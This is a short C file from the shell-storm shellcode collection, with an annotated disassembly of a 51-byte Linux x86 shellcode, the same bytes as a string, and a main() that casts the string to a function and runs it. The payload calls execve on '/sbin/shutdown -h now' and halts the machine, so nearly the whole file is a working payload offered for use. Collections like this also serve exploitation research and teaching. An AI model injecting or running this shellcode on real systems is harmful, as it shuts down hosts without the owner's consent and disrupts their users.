/*  Linux x86 - Shutdown -h now - 51 bytes
 *  Jonathan Salwan js.rac.projet[*AT]gmail.com
 *  Web: http://www.shell-storm.org
 *
 *
 *Disassembly of section .text:
 *
 * 08048060 <_start>:
 * 8048060:       6a 0b                   push   $0xb
 * 8048062:       58                      pop    %eax
 * 8048063:       99                      cltd
 * 8048064:       52                      push   %edx
 * 8048065:       6a 77                   push   $0x77
 * 8048067:       66 68 6e 6f             pushw  $0x6f6e
 * 804806b:       89 e6                   mov    %esp,%esi
 * 804806d:       52                      push   %edx
 * 804806e:       66 68 2d 68             pushw  $0x682d
 * 8048072:       89 e1                   mov    %esp,%ecx
 * 8048074:       52                      push   %edx
 * 8048075:       68 64 6f 77 6e          push   $0x6e776f64
 * 804807a:       68 73 68 75 74          push   $0x74756873
 * 804807f:       68 69 6e 2f 2f          push   $0x2f2f6e69
 * 8048084:       68 2f 2f 73 62          push   $0x62732f2f
 * 8048089:       89 e3                   mov    %esp,%ebx
 * 804808b:       52                      push   %edx
 * 804808c:       56                      push   %esi
 * 804808d:       51                      push   %ecx
 * 804808e:       53                      push   %ebx
 * 804808f:       89 e1                   mov    %esp,%ecx
 * 8048091:       cd 80                   int    $0x80
 *
 */

main()
	{

		char shell[] =  "\x6a\x0b\x58\x99\x52\x6a\x77\x66"
				"\x68\x6e\x6f\x89\xe6\x52\x66\x68"
				"\x2d\x68\x89\xe1\x52\x68\x64\x6f"
				"\x77\x6e\x68\x73\x68\x75\x74\x68"
				"\x69\x6e\x2f\x2f\x68\x2f\x2f\x73"
				"\x62\x89\xe3\x52\x56\x51\x53\x89"
				"\xe1\xcd\x80";

		printf("Length: %d\n",strlen(shell));
		(*(void(*)()) shell)();

}